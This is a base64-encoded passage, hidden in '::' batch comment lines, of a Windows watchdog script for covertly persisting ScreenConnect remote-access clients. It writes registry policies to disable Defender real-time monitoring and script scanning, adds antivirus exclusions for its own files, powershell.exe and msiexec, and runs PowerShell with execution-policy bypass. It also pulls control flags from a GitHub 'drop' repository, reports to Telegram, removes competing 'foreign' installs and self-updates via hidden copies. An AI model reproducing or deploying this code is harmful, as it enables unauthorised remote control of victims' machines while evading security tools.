::cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0Rp
::ciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAibXNpLWZhaWxlZCIgPm51
::bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRkFJTCAiTVNJIGluc3RhbGwgZmFpbGVk
::IG9uIGFsbCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQlKSINCikgZWxz
::ZSAoDQogIGVjaG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
::c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtE
::aXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlc3RvcmVkIiA+bnVs
::IDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCBy
::ZWluc3RhbGxlZCBPSyINCikNCg0KOkFmdGVySGVhbA0KcmVtIE0xNjogQUxUIHBy
::ZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBhaXItYnktR1VJ
::RCAoZXZlcnkgdGljaykNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBh
::bHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiDQogICAgbmV0IHN0
::YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjEN
::CiAgICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIg
::Pm51bCAyPiYxDQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgICBz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5k
::ICJSVU5OSU5HIiA+bnVsDQogICAgaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIl
::V0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAi
::JVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KKQ0KcmVtIE0xNzogQUxUIHNlcnZp
::Y2UgZW50cnkgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkIC0+IHJlcGFp
::ci1ieS1HVUlEIGV2ZXJ5IHRpY2sNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENs
::aWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQog
::IGVjaG8gYWx0X21pc3NpbmdfdHJ5X3JlcGFpcj4+IiVMT0clIg0KICBpZiBleGlz
::dCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtE
::aXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQopDQpyZW0gKGV4dGVybWluYXRpb24g
::YWxyZWFkeSByYW4gcHJlLWhlYWwgaW4gW0VdOyBmb3JlaWduIHN1cnZpdm9ycyBj
::b3VudGVkIHRoZXJlKQ0KDQpyZW0g4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3Vy
::ZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgA0KcmVt
::IE0zOS9NNDM6IE1wUHJlZmVyZW5jZSB3aGVuIFdpbkRlZmVuZCBhbGl2ZTsgYWx3
::YXlzIGFsc28gd3JpdGUgcG9saWN5L2V4Y2x1c2lvbiBSRUcNCnJlbSAoSGVsbCBo
::b3N0OiBXaW5EZWZlbmQgZGVhZCDihpIgMHg4MDAxMDZiYSwgYnV0IEFNU0kgc3Rp
::bGwgYmxvY2tlZCBQUyDigJQgcmVnICsgb3duX2dyeXhhLmNtZCBjb3ZlciBpdCkN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFs
::dGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpy
::ZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dz
::IERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
::U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlV0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3Mg
::RGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVFVEwlIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
::cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVT
::eXN0ZW1Sb290JVxUZW1wXC51cGQiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwg
::Mj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBE
::ZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVByb2dyYW1GaWxlcyVcU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
::JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQcm9ncmFtRmlsZXMoeDg2KSVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3Mg
::RGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJTY3JlZW5Db25uZWN0
::LkNsaWVudFNlcnZpY2UuZXhlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
::JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNzZXMiIC92ICJtc2lleGVjLmV4ZSIgL3Qg
::UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21t
::YW5kICIkRXJyb3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsg
::dHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg
::JHRydWV9Y2F0Y2h7fTsgdHJ5e1NldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3Jp
::cHRTY2FubmluZyAkdHJ1ZX1jYXRjaHt9OyB0cnl7QWRkLU1wUHJlZmVyZW5jZSAt
::RXhjbHVzaW9uUGF0aCAnJVdEJScsJyVFVEwlJywoSm9pbi1QYXRoICRlbnY6UHJv
::Z3JhbUZpbGVzICdTY3JlZW5Db25uZWN0IENsaWVudConKSwoSm9pbi1QYXRoICR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykg
::LUVycm9yQWN0aW9uIFN0b3B9Y2F0Y2h7fTsgZm9yZWFjaCgkeCBpbiBAKCdTY3Jl
::ZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJywnU2NyZWVuQ29ubmVjdC5XaW5k
::b3dzQ2xpZW50LmV4ZScsJ21zaWV4ZWMuZXhlJywncG93ZXJzaGVsbC5leGUnKSl7
::dHJ5e0FkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJHggLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWV9Y2F0Y2h7fX0iID5udWwgMj4mMQ0KDQpy
::ZW0g4pSA4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBo
::IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFj
::dGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNt
::ZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRoICclV0QlXHNlYy5mbGFnJykpIC1v
::ciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXHNl
::Yy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsgZXhp
::dCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwg
::MSAoDQogIGVjaG8gcGVyaW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUiDQogIGNhbGwg
::IiVXRCVcb3duX3NlY3VyZS5jbWQiID4+IiVMT0clIiAyPiYxDQogIGVjaG8gZG9u
::ZT4iJVdEJVxzZWMuZmxhZyINCikNCg0KcmVtIOKUgOKUgCBbRzJdIEdyeXhhIE1V
::U1QtUlVOIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE80MDogaWYgQU5ZIG5v
::bi1zZXZyeiBTQyBSdW5uaW5nIOKGkiBuZXZlciBtc2lleGVjIChzdG9wcyBwYW5l
::bCBkdXBsaWNhdGVzKS4NCnNldCAiR1JZWEFfT0s9MCINCnNldCAiR1JZWEFfV0FT
::PTAiDQpzZXQgIkRPX0RFRVA9MCINCnNldCAiRk9SQ0VfRz0wIg0KaWYgZXhpc3Qg
::IiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVs
::aW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kgIiUlSyI9
::PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCg0KcmVtIEZPUkNFIHB1
::c2g6IGNvbnRlbnQtaGFzaCB2aWEgZmMgL2IgKHJlLWZpcmUgd2hlbiBmbGFnIGNv
::bnRlbnQgY2hhbmdlcyk7IHJhdy1maXJzdA0KIiVDVVJMJSIgLUwgLS1zc2wtbm8t
::cmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGltZSAyMCAtbyAiJVdE
::JVxmb3JjZV9ncnl4YS5uZXciICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
::dC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9mb3JjZV9ncnl4YS5mbGFn
::P3Q9JVJBTkRPTSUlUkFORE9NJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVX
::RCVcZm9yY2VfZ3J5eGEubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91
::dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiaHR0
::cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1h
::aW4vZm9yY2VfZ3J5eGEuZmxhZz90PSVSQU5ET00lJVJBTkRPTSUiID5udWwgMj4m
::MQ0KaWYgZXhpc3QgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAoDQogIGZpbmRzdHIg
::L0M6IlBVU0giICIlV0QlXGZvcmNlX2dyeXhhLm5ldyIgPm51bCAyPiYxDQogIGlm
::IG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGlmIG5vdCBleGlzdCAiJVdEJVxmb3Jj
::ZV9ncnl4YS5kb25lIiAoDQogICAgICBzZXQgIkZPUkNFX0c9MSINCiAgICApIGVs
::c2UgKA0KICAgICAgZmMgL2IgIiVXRCVcZm9yY2VfZ3J5eGEubmV3IiAiJVdEJVxm
::b3JjZV9ncnl4YS5kb25lIiA+bnVsIDI+JjENCiAgICAgIGlmIGVycm9ybGV2ZWwg
::MSBzZXQgIkZPUkNFX0c9MSINCiAgICApDQogICkNCikNCg0KcmVtIERldGVjdCBh
::bnkgUnVubmluZyBub24tc2V2cnogU2NyZWVuQ29ubmVjdCAodHJ1ZSBHcnl4YSBw
::cmVzZW5jZSkNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
::IC1BY3Rpb24gZ3J5eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiA+IiVXRCVcZ3J5
::eGFfaGVhbHRoLm91dCIgMj5udWwNCnNldCAiR0g9Ig0KaWYgZXhpc3QgIiVXRCVc
::Z3J5eGFfaGVhbHRoLm91dCIgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIg
::aW4gKCIlV0QlXGdyeXhhX2hlYWx0aC5vdXQiKSBkbyBzZXQgIkdIPSUlUiINCmVj
::aG8gZ3J5eGFfaGVhbHRoPSFHSCE+PiIlTE9HJSINCmVjaG8gIUdIIXwgZmluZHN0
::ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAo
::DQogIHNldCAiR1JZWEFfT0s9MSINCiAgc2V0ICJHUllYQV9XQVM9MSINCiAgaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCikNCg0KcmVt
::IEZPUkNFIHB1c2ggb3ZlcnJpZGVzIGhlYWx0aHktc2tpcDogcnVuIGEgZm9yY2Vk
::IGVuc3VyZSB0aGlzIHRpY2sNCmlmICIlRk9SQ0VfRyUiPT0iMSIgKA0KICBlY2hv
::IGdyeXhhX2ZvcmNlX3B1c2g+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3du
::X2xpYi5wczEiICgNCiAgICBzZXQgIkdSRVM9Ig0KICAgIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1lbnN1cmUgLURlZXAgLUZvcmNlIC1O
::b1dhaXQgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJWApIGRvIHNldCAi
::R1JFUz0lJVIiDQogICAgZWNobyBncnl4YV9mb3JjZV9yZXN1bHQ9IUdSRVMhPj4i
::JUxPRyUiDQogICAgY29weSAveSAiJVdEJVxmb3JjZV9ncnl4YS5uZXciICIlV0Ql
::XGZvcmNlX2dyeXhhLmRvbmUiID5udWwgMj4mMQ0KICApDQogIGdvdG8gOkdyeXhh
::QWZ0ZXINCikNCg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtQ29tbWFuZCAiaWYoKCAtbm90IChUZXN0LVBhdGggJyVHUllYQV9ERUVQJScp
::KSAtb3IgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVHUllY
::QV9ERUVQJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSA4
::KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlcnJv
::cmxldmVsIDEgc2V0ICJET19ERUVQPTEiDQoNCnJlbSBIZWFsdGh5ICsgbm90IGRl
::ZXAgZHVlIOKGkiB6ZXJvIHdvcmsNCmlmICIlR1JZWEFfT0slIj09IjEiIGlmICIl
::RE9fREVFUCUiPT0iMCIgKA0KICBlY2hvIGdyeXhhX3NraXBfYWxyZWFkeV9oZWFs
::dGh5Pj4iJUxPRyUiDQogIGdvdG8gOkdyeXhhQWZ0ZXINCikNCg0KcmVtIERlZXAg
::b3IgbWlzc2luZzogZ3J5eGEtZW5zdXJlIG9ubHkgKGxpYiBsb2NrcyBtc2lleGVj
::IGlmIFJ1bm5pbmcpDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBz
::ZXQgIkdSRVM9Ig0KICBpZiAiJURPX0RFRVAlIj09IjEiICgNCiAgICBlY2hvIGdy
::eXhhX2RlZXBfYmVnaW4+PiIlTE9HJSINCiAgICBmb3IgL2YgInVzZWJhY2txIGRl
::bGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
::Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
::Yi5wczEiIC1BY3Rpb24gZ3J5eGEtZW5zdXJlIC1EZWVwIC1Ob1dhaXQgLVdvcmtE
::aXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJWApIGRvIHNldCAiR1JFUz0lJVIiDQog
::ICkgZWxzZSAoDQogICAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4g
::KGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
::IGdyeXhhLWVuc3VyZSAtTm9XYWl0IC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1P
::TlZFUiVgKSBkbyBzZXQgIkdSRVM9JSVSIg0KICApDQogIGVjaG8gZ3J5eGFfZW5z
::dXJlX3Jlc3VsdD0hR1JFUyE+PiIlTE9HJSINCiAgcmVtIE00MTogb25seSBtYXJr
::IE9LIG9uIHRydWUgSEVBTFRIWXwuLi5ydW5uaW5nL3N0YXJ0ZWQvc3ZjLXJlY3Jl
::YXRlZCDigJQgbmV2ZXIgSU5GTElHSFQvc3Bhd25lZA0KICBlY2hvICFHUkVTIXwg
::ZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWXwiIHwgZmluZHN0ciAvSSAicnVubmlu
::Zz0xIHN0YXJ0ZWQ9MSBzdmMtcmVjcmVhdGVkPTEiID5udWwNCiAgaWYgbm90IGVy
::cm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQppZiAiJURPX0RFRVAlIj09
::IjEiIGVjaG8gZG9uZT4iJUdSWVhBX0RFRVAlIg0KaWYgIiVHUllYQV9PSyUiPT0i
::MCIgY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQoNCjpHcnl4YUFmdGVyDQppZiBleGlz
::dCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBk
::ZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVL
::Ij09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0Kc2V0ICJHUllYQV9P
::Sz0wIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAl
::KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNl
::dCAiR1JZWEFfT0s9MSINCnJlbSBhbHNvIE9LIGlmIHZlcmlmaWVkIEdyeXhhIEZQ
::IChyZWxheS9leHBlY3RlZCkgaXMgaGVhbHRoeQ0KaWYgIiVHUllYQV9PSyUiPT0i
::MCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1F
::eGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAt
::QWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAiJVdEJSIgMj5udWwgfCBmaW5k
::c3RyIC9JIC9CIC9DOiJIRUFMVEhZfCIgfCBmaW5kc3RyIC9JICJydW5uaW5nPTEi
::ID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQop
::DQoNCmlmICIlR1JZWEFfT0slIj09IjEiIGlmICIlR1JZWEFfV0FTJSI9PSIwIiAo
::DQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEg
::ImdyeXhhLXJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdHcnl4YSBSRVNU
::T1JFRCAiR3J5eGEgU2NyZWVuQ29ubmVjdCBoZWFsdGh5IChzdmMgcnVubmluZyki
::DQopDQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVX
::RCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgImdyeXhhLW11c3QtZmFpbCIgPm51
::bCAyPiYxDQogIGNhbGwgOlRnR3J5eGEgRE9XTiAiR3J5eGEgTVVTVC1SVU4gLSBz
::ZXJ2aWNlIG5vdCBSdW5uaW5nIGFmdGVyIGhlYWwiDQopDQoNCnJlbSDilIDilIAg
::W0hdIHF1aWV0IGRpZ2VzdCAoc2tpcCBoZWFsdGh5IGhvc3RzIOKAlCB3YXMgZmxv
::b2RpbmcgVGVsZWdyYW0pIOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5w
::czEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+
::JjENCnNldCAiTkVFRF9IQj0wIg0KaWYgIiVQUklNX09LJSI9PSIwIiBzZXQgIk5F
::RURfSEI9MSINCmlmICVGT1JFSUdOX0xFRlQlIEdUUiAwIHNldCAiTkVFRF9IQj0x
::Ig0KaWYgIiVHUllYQV9PSyUiPT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAiJU5F
::RURfSEIlIj09IjAiICgNCiAgZWNobyBoYl9za2lwX2hlYWx0aHk+PiIlTE9HJSIN
::CikgZWxzZSAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
::dmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3
::LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFH
::JScpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYwKXsgZXhpdCAw
::IH0gZWxzZSB7IGV4aXQgMSB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAx
::ICgNCiAgICBlY2hvIGhiPiVIQkZMQUclDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
::ZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAt
::QnVpbGQgJU1PTlZFUiUgLUNvdW50ICFDT1VOVCEgPm51bCAyPiYxDQogICAgZWNo
::byBkaWdlc3QgSEIgc2VudD4+IiVMT0clIg0KICApDQopDQoNCnJlbSDilIDilIAg
::W0ldIHNlbGYtdXBkYXRlIGFwcGx5IChsYXN0IHRoaW5nIHRoaXMgdGljaykg4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiAiJVNF
::TEZfVVBEJSI9PSIxIiAoDQogIGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9H
::JSINCiAgYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+
::JjENCiAgbW92ZSAveSAiJVNUQUdFJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9t
::b24uY21kIiA+bnVsIDI+JjENCikNCnJlbSBrZWVwIGR1YWwtcGF0aCBiYWNrdXAg
::aW4gc3luYyBldmVyeSB0aWNrDQppZiBub3QgZXhpc3QgIiVFVEwlIiBta2RpciAi
::JUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgN
::CiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYx
::DQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNt
::ZCIgPm51bCAyPiYxDQopDQpkZWwgL2YgL3EgIiVNVVRFWCUiID5udWwgMj4mMQ0K
::DQplY2hvIHRpY2sgZG9uZTogcHJpbT0lUFJJTV9PSyUgZ3J5eGE9JUdSWVhBX09L
::JSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lRk9SRUlHTl9MRUZUJT4+IiVMT0clIg0K
::ZW5kbG9jYWwNCmV4aXQgL2IgMA0KDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhlbHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQo6RW5zdXJlR3J5eGFNdXN0
::DQpyZW0gTTQzOiB0cnkgUFMgbGliIGZpcnN0OyBpZiBtaXNzaW5nL0FNU0ktYmxv
::Y2tlZC9zdGlsbCBkb3duIOKGkiBwdXJlLWNtZCBvd25fZ3J5eGEuY21kDQpzZXQg
::IkdSWVhBX09LPTAiDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAi
::dXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4
::YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFf
